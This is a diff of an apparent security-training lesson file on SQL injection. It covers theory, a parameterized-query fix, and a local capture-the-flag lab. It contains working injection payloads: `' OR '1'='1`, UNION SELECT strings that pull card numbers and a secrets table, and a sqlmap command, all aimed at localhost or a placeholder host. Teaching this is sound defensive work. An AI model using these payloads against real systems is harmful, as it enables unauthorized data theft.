@@ -4,9 +4,9 @@
   "title": "SQL Injection",
   "track": "OWASP Top 10",
   "difficulty": "core",
-  "estimate": "20 min",
+  "estimate": "25 min",
   "brief": "**Ticket:** the user search box seems to run straight into the database. Prove you can read data you shouldn't, and capture what's in the hidden vault.",
-  "theory": "## SQL Injection (OWASP A03)\nThe server builds a query by gluing your input into a string, so SQL syntax in your input changes the query. `' OR '1'='1` returns everything; `UNION SELECT` reads other tables.\n\n**Fix:** parameterized queries \u2014 the query text and your data travel separately, so input can't change the query.",
+  "theory": "## What it is\nSQL Injection is tricking a database by smuggling SQL syntax inside normal input.\nIt happens when the server builds a query by gluing your input into a text\nstring.\n\n## How it works\nThe server runs `SELECT * FROM users WHERE username = '<your input>'`. Send\n`x' OR '1'='1` and the query becomes `... WHERE username = 'x' OR '1'='1'`, which\nis always true and returns every row. `UNION SELECT` lets you read other tables\n(passwords, card numbers, flags). Think of writing extra instructions in a form\nblank that the clerk then follows.\n\n## In the real world\nSQLi is **OWASP A03 (Injection)**. The TalkTalk breach (2015) that leaked ~157,000\ncustomer records was SQL injection through a web page. It is old, well understood,\nand *still* found constantly because developers keep concatenating strings.\n\n## How to prevent it\nUse **parameterized queries** (prepared statements): the query text and your data\ntravel separately, so input can never change the query's structure -\n`cur.execute(\"... WHERE username = ?\", (username,))`. Input validation is a useful\nsecond layer, not the fix.",
   "worked_example": "```\n$ curl -s -G https://x/api/search --data-urlencode \"q=a' UNION SELECT card,cvv FROM cards-- -\"\n[{\"card\":\"4111...\",\"cvv\":\"123\"}]   # leaked another table\n```",
   "knowledge_check": [
     {
@@ -33,11 +33,14 @@
     }
   ],
   "investigation": {
-    "intro": "Use a UNION to read the hidden `secrets` table.",
+    "intro": "Prove injection on a real app, then use a UNION to leak a hidden table and capture its flag.",
     "steps": [
-      "```bash\ncd /workspaces/examto/ctf-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate 2>/dev/null; pip install -q -r requirements.txt\npython3 target/run_target.py        # leave this running\n```",
-      "In a second terminal, inject a UNION (note -G --data-urlencode so curl encodes the quotes/spaces):\n```bash\ncurl -s -G http://127.0.0.1:5000/api/search --data-urlencode \"username=' UNION SELECT flag, label FROM secrets-- -\"\n```",
-      "The flag comes back in the `username` field of the result."
+      "**Start the lab app** (leave it running; open a *second* terminal tab for the attack):\n```bash\ncd /workspaces/examto/appsec-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate; pip install -q -r requirements.txt\npython3 run_server.py\n```",
+      "In a second terminal, see a normal search (one user) versus an injection that returns EVERY user (note `-G --data-urlencode` so curl encodes the quotes/spaces):\n```bash\ncd /workspaces/examto/appsec-lab\ncurl -s -G \"http://127.0.0.1:5000/api/search\" --data-urlencode \"username=alice\"\ncurl -s -G \"http://127.0.0.1:5000/api/search\" --data-urlencode \"username=x' OR '1'='1\"\n```",
+      "**Apply the fix and re-test.** Stop the server (Ctrl+C) and restart it in secure mode, then run the SAME attack again:\n```bash\nLAB_SECURE=1 python3 run_server.py\n```\nRe-run the injection: in secure mode it returns `[]` because the input is treated as data.",
+      "Now the flag. Start the CTF target and use a UNION to read the hidden `secrets` table:\n```bash\ncd /workspaces/examto/ctf-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate; pip install -q -r requirements.txt\npython3 target/run_target.py        # leave running\n```",
+      "In another terminal, inject the UNION (two columns, to match the real query):\n```bash\ncurl -s -G http://127.0.0.1:5000/api/search --data-urlencode \"username=' UNION SELECT flag, label FROM secrets-- -\"\n```\nThe `FLAG{...}` comes back in the `username` field - that is your capture answer.",
+      "Optional real tool: with a target running, `sqlmap -u \"http://127.0.0.1:5000/api/search?username=alice\" -p username --batch` confirms the same flaw with the industry-standard scanner."
     ],
     "hints": [
       "Break out of the quoted string with a single quote.",
